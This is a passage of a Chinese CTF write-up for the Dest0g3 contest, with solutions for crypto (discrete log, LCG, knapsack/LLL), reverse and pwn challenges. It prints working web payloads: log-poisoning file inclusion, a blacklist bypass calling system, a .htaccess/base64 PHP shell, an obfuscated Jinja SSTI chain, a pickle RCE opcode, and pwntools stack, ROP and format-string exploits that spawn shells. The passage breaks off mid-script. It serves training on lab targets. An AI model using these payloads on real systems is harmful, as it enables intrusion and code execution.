p)print(h)&#x27;&#x27;&#x27;199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162&#x27;&#x27;&#x27; DLP求解： 12345678# Sageg = 19p = h = x = discrete_log(mod(h,p),mod(g,p))print(bytes.fromhex(hex(x)[2:]))# b&#x27;Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;&#x27; ​ ezStream 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Util.number import *f = open(&#x27;flag.txt&#x27;, &#x27;r&#x27;)flag = f.read()f.close()assert flag[:8] == &quot;Dest0g3&#123;&quot;class LCG: def __init__(self): self.a = getRandomNBitInteger(32) self.b = getRandomNBitInteger(32) self.m = getPrime(32) self.seed = getRandomNBitInteger(32) def next(self): self.seed = (self.a * self.seed + self.b) % self.m return self.seed &gt;&gt; 16 def output(self): print(&quot;a = &#123;&#125;\\nb = &#123;&#125;\\nm = &#123;&#125;&quot;.format(self.a, self.b, self.m)) print(&quot;state1 = &#123;&#125;&quot;.format(self.next())) print(&quot;state2 = &#123;&#125;&quot;.format(self.next()))lcg = LCG()lcg.output()c = b&#x27;&#x27;.join([long_to_bytes(ord(flag[i]) ^ (lcg.next() % 10)) for i in range(len(flag))])print(bytes_to_long(c))&#x27;&#x27;&#x27;a = 3939333498b = 3662432446m = 2271373817state1 = 17362state2 = 20624600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878&#x27;&#x27;&#x27; LCG，爆破求seed： 123456789101112131415161718a = 3939333498b = 3662432446m = 2271373817state1 = 17362state2 = 20624c = 600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878c = list(bytes.fromhex(hex(c)[2:]))for i in range(65536): s1 = (state1&lt;&lt;16)+i s2 = (a*s1+b) % m if s2&gt;&gt;16 == state2: seed = ((s1-b)*inverse_mod(a,m))%m print(seed) # 1315807869# 710396196# 104984523 三个结果分别代入求解： 123456789101112131415161718192021222324252627c = 600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878c = list(bytes.fromhex(hex(c)[2:]))seed = [1315807869,710396196,104984523]for k in seed: class LCG: def __init__(self): self.a = 3939333498 self.b = 3662432446 self.m = 2271373817 self.seed = k def next(self): self.seed = (self.a * self.seed + self.b) % self.m return self.seed &gt;&gt; 16 lcg = LCG() lcg.next() lcg.next() flag = &#x27;&#x27; for i in range(len(c)): flag += chr(c[i] ^^ (lcg.next() % 10)) print(flag) # Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|# Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;# Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125; ​ Mr.Doctor 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from Crypto.Util.number import *from hashlib import sha256import stringtable = string.ascii_letters + string.digitsflag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()[8:-1]seed = getRandomNBitInteger(40)class SHA256: def __init__(self): self.proof = [] self.sha = 0 self.sha_flag = [] def encryption(self): for i in range(len(flag) // 4): self.proof.append(flag[4 * i:4 + 4 * i]) self.sha = sha256(self.proof[i]).hexdigest().encode() self.sha_flag.append(bytes_to_long(self.sha)) return self.sha_flagclass RHODES_ELITE: def __init__(self): self.Doctor = getPrime(64) self.Amiya = getRandomNBitInteger(40) self.Rosmontis = getRandomNBitInteger(40) self.Blaze = getRandomNBitInteger(40) self.seed = seed def next(self): self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor return self.seed &gt;&gt; 12 def output(self): print(&quot;Amiya = &quot;, self.Amiya) print(&quot;Rosmontis = &quot;, self.Rosmontis) print(&quot;Blaze = &quot;, self.Blaze) print(&quot;Doctor = &quot;, self.Doctor)sha = SHA256()sha_flag = sha.encryption()elite = RHODES_ELITE()elite.output()print(&quot;Ash = &quot;, elite.next())print(&quot;SliverAsh = &quot;, elite.next())W = b&#x27;&#x27;.join([long_to_bytes(sha_flag[i] % (seed ** 3) ^ (elite.next() % 100)) for i in range(len(sha_flag))])print(bytes_to_long(W))&#x27;&#x27;&#x27;Amiya = 956366446278Rosmontis = 1061992537343Blaze = 636205571590Doctor = 18068433704538283397Ash = 1097363493609113SliverAsh = 20514313441603271920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084&#x27;&#x27;&#x27; 二阶LCG + 4位一轮爆破，用二元Coppersmith方法求seed： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] a = 956366446278b = 1061992537343c = 636205571590p = 18068433704538283397state1 = 1097363493609113state2 = 2051431344160327PR.&lt; s1_low, s2_low &gt; = PolynomialRing(Zmod(p))f = a * ((state1 &lt;&lt; 12) + s1_low) ^ 2 + b * ((state1 &lt;&lt; 12) + s1_low) + c - (state2 &lt;&lt; 12) - s2_lowstate1 = small_roots(f, (2 ^ 28, 2 ^ 28), m=3)[0][0] + (state1 &lt;&lt; 12)state2 = small_roots(f, (2 ^ 28, 2 ^ 28), m=3)[0][1] + (state2 &lt;&lt; 12)P.&lt;x&gt; = PolynomialRing(Zmod(p))f = a * x * x + b * x + c - state1seed = f.monic().roots()[1][0]print(seed)# 626844643882 代入逐4位爆破flag： 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforceclass lcg: def __init__(self): self.p = 18068433704538283397 self.a = 956366446278 self.b = 1061992537343 self.c = 636205571590 self.seed = 626844643882 def next(self): self.seed = (self.a * self.seed * self.seed + self.b * self.seed + self.c) % self.p return self.seed &gt;&gt; 12l = lcg()seed = l.seedl.next()l.next()c = 1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084c = hex(c)[2:].rjust(9*30,&#x27;0&#x27;)table = &#x27;0123456789abcdef-&#x27;def pow(nowc): print(nowc) t=l.next() print(t) return mbruteforce(lambda x: hex(int(sha256(x).hexdigest().encode(&#x27;hex&#x27;),16)%(seed**3)^(t%100))[2:].rjust(30,&#x27;0&#x27;) == nowc, table, length=4, method=&#x27;fixed&#x27;) flag = &#x27;&#x27;for i in range(9): flag += pow(c[30*i:30*(i+1)])print(flag)# d2a4d1af-8a80-8794-99ac-635f89494cac ​ Bag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import gmpy2from Crypto.Util.number import *from secret import flagmessage = bytes_to_long(flag[8:-1])Baglenth=286Bag=[]Bag=Bag[::-1]m=372992427307339981616536686110115630075342113098010788080347982669869622759400031649792w=274062421102700155372289583695782343443assert gmpy2.gcd(m,w)==1h=0j=0if m.bit_length()%2==0: h=m.bit_length() j=int(h//2)else: h=m.bit_length() j=int(h//2+1)def pad(m,lenth): while len(m)&lt;lenth: m=&#x27;0&#x27;+m return mdef keygen(): pk=[] sk=[] sk.append(m) sk.append(int(gmpy2.invert(w,m))) D=[] binD=[] for i in range(Baglenth): di=(w*Bag[i])%m D.append(di) bindi=bin(di)[2:] bindi=pad(bindi,h) binD.append(bindi) U=[] V=[] for i in range(Baglenth): tempu=int(str(binD[i][:j]),2) U.append(tempu) tempv=int(str(binD[i][j:]),2) V.append(tempv) e=gmpy2.next_prime(sum(V))+2 f=gmpy2.next_prime(sum(U)) assert gmpy2.gcd(e,f)==1 sk.append(int(e)) sk.append(int(f)) for i in range(Baglenth): ai=e*U[i]+f*V[i] pk.append(int(ai)) return pk,skPk,Sk=keygen()print(Pk)print(Sk)def Encrypt(plain,pk): mbin=bin(plain)[2:] c=0 mbin=pad(mbin,Baglenth) for i in range(Baglenth): c=c+int(mbin[i])*pk[i] return cc=Encrypt(message,Pk)print(c) 背包密码系统，LLL算法解。 12345678910111213141516171819202122232425262728# Sageimport binasciipubKey = []nbit = len(pubKey)encoded = A = Matrix(ZZ, nbit + 1, nbit + 1)for i in range(nbit): A[i, i] = 1for i in range(nbit): A[i, nbit] = pubKey[i]A[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print(i, M) M = &#x27;&#x27;.join(str(j) for j in M) M = M[:-1] M = hex(int(M, 2))[2:] print(bytes.fromhex(M)) b&#x27;5090ea29-8cb6-4ad8-ab43-1e6f65cc8eeb&#x27; ​ WEBphpdest 123456&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123; require_once($_GET[&#x27;file&#x27;]);&#125; 文件包含，绕 require_once，burpsuite或 curl -A 修改User-Agent为 &lt;?php show_source(&quot;flag.php&quot;);?&gt;， 然后用日志包含 ?file=/var/log/nginx/access.log 得到flag。 ​ EasyPHP Post something 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);include &quot;fl4g.php&quot;;$dest0g3 = $_POST[&#x27;ctf&#x27;];$time = date(&quot;H&quot;);$timme = date(&quot;d&quot;);$timmme = date(&quot;i&quot;);if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123; echo $fl4g;&#125;else&#123; echo &quot;Try harder!&quot;;&#125;set_error_handler( function() use(&amp;$fl4g) &#123; print $fl4g; &#125;);$fl4g .= $dest0g3;?&gt; 异常处理函数 use() 中输出flag，传参时传入数组即可触发异常：ctf[]=1。 ​ SimpleRCE 1234567&lt;?phphighlight_file(__FILE__);$aaa=$_POST[&#x27;aaa&#x27;];$black_list=array(&#x27;^&#x27;,&#x27;.&#x27;,&#x27;`&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;=&#x27;,&#x27;&quot;&#x27;,&#x27;preg&#x27;,&#x27;&amp;&#x27;,&#x27;|&#x27;,&#x27;%0&#x27;,&#x27;popen&#x27;,&#x27;char&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;file&#x27;,&#x27;ascii&#x27;,&#x27;eval&#x27;,&#x27;replace&#x27;,&#x27;assert&#x27;,&#x27;exec&#x27;,&#x27;$&#x27;,&#x27;include&#x27;,&#x27;var&#x27;,&#x27;pastre&#x27;,&#x27;print&#x27;,&#x27;tail&#x27;,&#x27;sed&#x27;,&#x27;pcre&#x27;,&#x27;flag&#x27;,&#x27;scan&#x27;,&#x27;decode&#x27;,&#x27;system&#x27;,&#x27;func&#x27;,&#x27;diff&#x27;,&#x27;ini_&#x27;,&#x27;passthru&#x27;,&#x27;pcntl&#x27;,&#x27;proc_open&#x27;,&#x27;+&#x27;,&#x27;cat&#x27;,&#x27;tac&#x27;,&#x27;more&#x27;,&#x27;sort&#x27;,&#x27;log&#x27;,&#x27;current&#x27;,&#x27;\\\\&#x27;,&#x27;cut&#x27;,&#x27;bash&#x27;,&#x27;nl&#x27;,&#x27;wget&#x27;,&#x27;vi&#x27;,&#x27;grep&#x27;);$aaa = str_ireplace($black_list,&quot;hacker&quot;,$aaa);eval($aaa);?&gt; 黑名单绕过rce，用16进制编码绕过：aaa=hex2bin(&#39;73797374656d&#39;)(&#39;uniq /f*&#39;); ​ funny_upload文件上传后缀白名单绕过，利用.htaccess文件实现非PHP文件解析成PHP代码执行。 先上传 .htaccess 文件，由于文件中不能包含 &lt;? ，用PHP伪协议base64解码处理： 12AddType application/x-httpd-php .xxxphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot; 再上传base64编码后的 shell.xxx 文件： 1PD9waHAgcHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7 访问 shell.xxx，其中内容 &lt;?php print_r(file_get_contents(&#39;/flag&#39;)); 以PHP代码执行，得到flag。 ​ EasySSTI登录框随便输入账号密码，进入 Hello xxx 界面，尝试更换账号为 &#123;&#123;2*3&#125;&#125;，出现 Hello 6，可利用SSTI注入rce。 Fuzz发现过滤了很多符号，包括 request _ &#39; &quot; [ . 空格 class getitem import 等，不过 config 可用，可从 &#123;&#123;config&#125;&#125; 内容字符串中找到所需字符来拼接构造字符串，可以避免用到引号；过滤的关键词使用 dict(cla=aa,ss=bb)|join() 形式绕过： 123456789101112131415# _config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3)# 空格config|string()|list()|attr(dict(p=aa,op=bb)|join())(7)# /config|string()|list()|attr(dict(p=aa,op=bb)|join())(279)# __class__(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(cla=aa,ss=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2# config.__class__.__init__.__globals__config|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(cla=aa,ss=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(in=aa,it=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(glo=aa,bals=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)#config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()config|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(cla=aa,ss=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(in=aa,it=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(glo=aa,bals=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(geti=aa,tem=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)(dict(o=aa,s=bb)|join())|attr(dict(po=aa,pen=bb)|join())(dict(c=aa,at=bb)|join()+config|string()|list()|attr(dict(p=aa,op=bb)|join())(7)+config|string()|list()|attr(dict(p=aa,op=bb)|join())(279)+dict(fl=aa,ag=bb)|join())|attr(dict(re=aa,ad=bb)|join())() ​ middle 1234567891011121314151617181920212223242526272829303132333435363738394041424344import osimport configfrom flask import Flask, request, session, render_template, url_for,redirect,make_responseimport pickleimport ioimport sysimport base64app = Flask(__name__)class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [&#x27;config&#x27;] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route(&#x27;/&#x27;)def show(): base_dir = os.path.dirname(__file__) resp = make_response(open(os.path.join(base_dir, __file__)).read()+open(os.path.join(base_dir, &quot;config/__init__.py&quot;)).read()) resp.headers[&quot;Content-type&quot;] = &quot;text/plain;charset=UTF-8&quot; return resp@app.route(&#x27;/home&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def home(): data=request.form[&#x27;data&#x27;] User = restricted_loads(base64.b64decode(data)) return str(User)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=5000)import osdef backdoor(cmd): # 这里我也改了一下 if isinstance(cmd,list) : s=&#x27;&#x27;.join(cmd) print(&quot;!!!!!!!!!!&quot;) s=eval(s) return s else: print(&quot;??????&quot;) flask框架，用到python反序列化，参考巅峰极客2021 - what_pickle，限制了加载的模块只能为 config 里的，名字不能有 __，但是可以通过 config 的 backdoor(cmd) 函数绕过。 这题简化了 backdoor(cmd) 函数的使用条件，直接调用即可。利用pker构造opcode： 1234b&#x27;&#x27;&#x27;(cconfigbackdoor(S&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt&quot;).read()&#x27;lo.&#x27;&#x27;&#x27; base64编码opcode，传参： data=KGNjb25maWcKYmFja2Rvb3IKKFMnX19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnLnR4dCIpLnJlYWQoKScKbG8u ​ REVERSEsimpleXOR 简单的加密 main() 代码： 12345678910111213141516171819202122232425262728int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4[72]; // [rsp+0h] [rbp-160h] char v5[52]; // [rsp+120h] [rbp-40h] BYREF int v6; // [rsp+154h] [rbp-Ch] unsigned int j; // [rsp+158h] [rbp-8h] int i; // [rsp+15Ch] [rbp-4h] v6 = 247; printf(&quot;input flag:&quot;); __isoc99_scanf(&quot;%s&quot;, v5); for ( i = 0; i &lt;= 35; ++i ) &#123; v4[i + 36] = v5[i]; v4[i] = v6 ^ (v4[i + 36] + i); &#125; for ( j = 0; j &lt;= 0x23; ++j ) &#123; if ( v4[j] != result_0[j] ) &#123; puts(&quot;Wrong!!!&quot;); return 0; &#125; if ( j == 35 ) puts(&quot;Success!!!&quot;); &#125; return 0;&#125; 先加下标值再异或247，最后校验密文，简单还原： 12345c = [179, 145, 130, 128, 195, 155, 206, 117, 207, 156, 154, 133, 133, 205, 184, 132, 170, 125, 189, 187, 177, 181, 150, 113, 141, 158, 134, 191, 115, 168, 163, 156, 131, 101, 158, 87]flag = [(c[i]^247)-i for i in range(len(c))]print(bytes(flag))# b&#x27;Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;&#x27; ​ himain() 代码： 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // [rsp+4h] [rbp-ACh] int v1; // [rsp+8h] [rbp-A8h] char enc[45]; // [rsp+10h] [rbp-A0h] char str[100]; // [rsp+40h] [rbp-70h] BYREF unsigned __int64 v8; // [rsp+A8h] [rbp-8h] v8 = __readfsqword(0x28u); memset(str, 0, sizeof(str)); *(_QWORD *)enc = 0x9F8E7A1CC6486497LL; *(_QWORD *)&amp;enc[8] = 0x69EEF382E760BD46LL; *(_QWORD *)&amp;enc[16] = 0xB9C017E2E30EF749LL; *(_QWORD *)&amp;enc[24] = 0x98410148A430392CLL; *(_QWORD *)&amp;enc[32] = 0xE80E7411E5B5A939LL; *(_DWORD *)&amp;enc[40] = 0xA58BFDAC; enc[44] = 109; fwrite(&quot;input: &quot;, 1uLL, 7uLL, stdout); fgets(str, 46, stdin); if ( strlen(str) != 45 ) exit(0); for ( i = 0; i &lt;= 44; ++i ) &#123; v1 = 23 * str[i]; if ( ((unsigned int)((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24) + (_BYTE)v1 + x[i] - ((unsigned int)((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24) != enc[i] ) exit(0); &#125; puts(&quot;good!&quot;); return 0;&#125; 加密逻辑中 ((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24) 互减抵消，剩下 23 * str[i] + x[i] == enc[i]，简单还原： 1234567import gmpy2enc = [151, 100, 72, 198, 28, 122, 142, 159, 70, 189, 96, 231, 130, 243, 238, 105, 73, 247, 14, 227, 226, 23, 192, 185, 44, 57, 48, 164, 72, 1, 65, 152, 57, 169, 181, 229, 17, 116, 14, 232, 172, 253, 139, 165, 109]x = [123, 81, 243, 90, 204, 57, 249, 146, 28, 158, 88, 105, 157, 247, 253, 74, 62, 251, 29, 44, 77, 12, 112, 177, 59, 141, 37, 237, 145, 177, 115, 141, 130, 230, 231, 80, 32, 97, 98, 60, 0, 58, 166, 157, 50]flag = [((enc[i]-x[i])*gmpy2.invert(23,256))%256 for i in range(len(enc))]print(bytes(flag))# b&#x27;Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;&#x27; ​ EZMATHILSpy查看dll文件，主要逻辑代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859private static void &lt;Main&gt;$(string[] args)&#123; Console.Write(&quot;Input your flag:&quot;); string text = Console.ReadLine(); if (!FormatChecker(text)) &#123; err(); &#125; string s = text.Replace(&quot;-&quot;, string.Empty); byte[] second = Checker.Encrypt2(Checker.Encrypt1(Encoding.ASCII.GetBytes(s))); if (new byte[32] &#123; 218, 49, 230, 35, 65, 168, 134, 53, 233, 62, 212, 208, 127, 224, 63, 164, 36, 88, 65, 138, 118, 255, 107, 22, 16, 239, 61, 58, 130, 101, 227, 109 &#125;.SequenceEqual(second)) &#123; Console.WriteLine(&quot;right!&quot;); Console.WriteLine(&quot;Your flag is Dest0g3&#123;&quot; + text + &quot;&#125;&quot;); &#125; else &#123; err(); &#125; static void err() &#123; Console.WriteLine(&quot;err!&quot;); Environment.Exit(1); &#125; static bool FormatChecker(string input) &#123; Guid result; return Guid.TryParse(input, out result); &#125;&#125;public static byte[] Encrypt1(byte[] a)&#123; List&lt;byte&gt; list = new List&lt;byte&gt;(); for (int i = 0; i &lt; 8; i++) &#123; uint value = (uint)((ulong)((long)utils.Unpack32(a[(4 * i)..(4 * (i + 1))]) * 83987L) % 4062393413uL); list.AddRange(BitConverter.GetBytes(value)); &#125; return list.ToArray();&#125;public static byte[] Encrypt2(byte[] a)&#123; List&lt;byte&gt; list = new List&lt;byte&gt;(); for (int i = 0; i &lt; 4; i++) &#123; ulong num = utils.Unpack64(a[(8 * i)..(8 * (i + 1))]); ulong value = num ^ (num &gt;&gt; 25); list.AddRange(BitConverter.GetBytes(value)); &#125; return list.ToArray();&#125; 输入字符串先经 Encrypt1() 以32位形式4位一组做乘法取模运算，再经 Encrypt2() 以64位形式8位一组做xorshift运算，逐步还原： 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *c = [218, 49, 230, 35, 65, 168, 134, 53, 233, 62, 212, 208, 127, 224, 63, 164, 36, 88, 65, 138, 118, 255, 107, 22, 16, 239, 61, 58, 130, 101, 227, 109]c1 = [bytes_to_long(bytes(c[8*i:8*(i+1)])[::-1]) for i in range(4)]def invert_right(m,l): length = 64 mx = (1 &lt;&lt; 64) - 1 i,res = 0,0 while i * l &lt; length: mask = (mx &lt;&lt; (length - l) &amp; mx) &gt;&gt; i * l tmp = m &amp; mask m = m ^ tmp &gt;&gt; l &amp; mx res += tmp i += 1 return resc2 = [invert_right(c1[i], 25) for i in range(4)]c3 = []for i in range(4): c3 += list(long_to_bytes(c2[i]))[::-1]c4 = [bytes_to_long(bytes(c3[4*i:4*(i+1)])[::-1]) for i in range(8)]c4 = [(k*inverse(83987,4062393413))%4062393413 for k in c4]c5 = []for i in range(8): c5 += list(long_to_bytes(c4[i]))[::-1]print(bytes(c5))# b&#x27;28956fc4c54045a8808d42a5fab4b5f8&#x27; ​ PWNez_aarch主要代码： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; sub_8EC(); func(); return 0;&#125;__int64 func()&#123; puts(&quot;It&#x27;s just a easy stack overflow.&quot;); return fun2();&#125;__int64 fun2()&#123; char buf; // [xsp+10h] [xbp+10h] BYREF puts(&quot;Please leave your name:&quot;); read(0, &amp;buf, 0x30uLL); return puts(&quot;OK, you can exploit it now.&quot;);&#125;__int64 backdoor()&#123; puts(&quot;OK, you get it !&quot;); return system(&quot;/bin/sh&quot;);&#125; arm的aarch64架构，开了PIE，与后门地址比较发现只有后1个字节不同，把返回地址的尾1字节改为后门地址尾1字节，简单栈溢出： 12345678from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 26257)r.recvline()r.send(&#x27;a&#x27;*(0x30-0x08) + &#x27;\\x3c&#x27;)r.interactive() ​ ez_pwn主要代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int hackme()&#123; int v1[10]; // [esp+4h] [ebp-44h] BYREF unsigned int v2; // [esp+2Ch] [ebp-1Ch] BYREF int v3; // [esp+30h] [ebp-18h] BYREF unsigned int v4; // [esp+34h] [ebp-14h] unsigned int i; // [esp+38h] [ebp-10h] unsigned int v6; // [esp+3Ch] [ebp-Ch] v6 = 0; v4 = 0; puts(&quot;input the length of array:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); if ( (int)abs32(v2) &gt; 10 ) &#123; puts(&quot;array is too long!&quot;); exit(0); &#125; while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;\\n\\n----------------------------------------------------&quot;); puts(&quot;choice:\\n1.add num\\n2.get sum\\n3.get avg\\n4.exit&quot;); puts(&quot;----------------------------------------------------\\n&quot;); puts(&quot;input your choice:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 != 3 ) break; if ( v4 ) printf(&quot;avg = %d\\n&quot;, v6 / v4); else puts(&quot;no avg!\\n&quot;); &#125; if ( v3 &gt; 3 ) break; if ( v3 == 1 ) &#123; if ( v4 &gt;= v2 ) &#123; puts(&quot;array is too long!&quot;); exit(0); &#125; puts(&quot;input num&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1[v4++]); &#125; else &#123; if ( v3 != 2 ) break; v6 = 0; for ( i = 0; v4 &gt; i; ++i ) v6 += v1[i]; printf(&quot;sum = %d\\n&quot;, v6); &#125; &#125; puts(&quot;exit!&quot;); return 0;&#125; 开始的 scanf 处未检查输入，读入负数可致负溢出，再结合写入数据的第二个 scanf， 可以越栈一直写，最后利用ROP修改返回地址，第一次ROP求libc基地址，第二次ROP可getshell： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 28547)elf = ELF(&#x27;./ez_pwn&#x27;)def add(n): r.sendlineafter(&#x27;input your choice:&#x27;, &#x27;1&#x27;) r.sendlineafter(&#x27;input num&#x27;, str(n))puts_plt = elf.plt.putsputs_got = elf.got.putshackme_addr = elf.sym.hackmer.recvuntil(&#x27;length of array:&#x27;)r.sendline(&#x27;-2147483648&#x27;)for i in range(10): add(1)add(1000)add(1)add(17)add(puts_plt)add(hackme_addr)add(puts_got)r.sendlineafter(&#x27;input your choice:&#x27;, &#x27;4&#x27;)r.recvuntil(&#x27;exit!\\n&#x27;)puts_addr = u32(r.recv(4))libc_base = puts_addr - 0x67560system_addr = libc_base + 0x3cf10binsh_addr = libc_base + 0x17b9dbr.recvuntil(&#x27;length of array:&#x27;)r.sendline(&#x27;-2147483648&#x27;)for i in range(10): add(1)add(1000)add(1)add(17)add(signed(system_addr))add(hackme_addr)add(signed(binsh_addr))r.sendlineafter(&#x27;input your choice:&#x27;, &#x27;4&#x27;)r.interactive() ​ dest_love主要代码： 123456789101112131415161718192021222324__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 i; // [rsp+0h] [rbp-10h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); for ( i = 0LL; i &lt;= 5; ++i ) &#123; puts(&quot;What about your love to Dest0g3?&quot;); read(0, format, 0x40uLL); printf(format); &#125; if ( dword_4010 == 1314520 ) &#123; puts(&quot;I can feel your love!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;Your dont love Dest0g3 at all!&quot;); &#125; return 0LL;&#125; 格式化字符串漏洞，需要改写值的串在bss段里。 123456789101112131415161718192021from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;,29044)e = ELF(&#x27;./pwn&#x27;)r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,b&#x27;aaa&#x27;)r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,b&#x27;aaa&#x27;)r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,b&#x27;%12$p%10$p&#x27;)base = int(r.recv(14),16) - 0x1185stack = int(r.recv(14),16) - 0xd8print(hex(stack))r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,&#x27;%&#123;&#125;c%10$hn&#x27;.format(stack % 0x10000))target = base + 0x4010r.sendafter(b&#x27;What about your love to 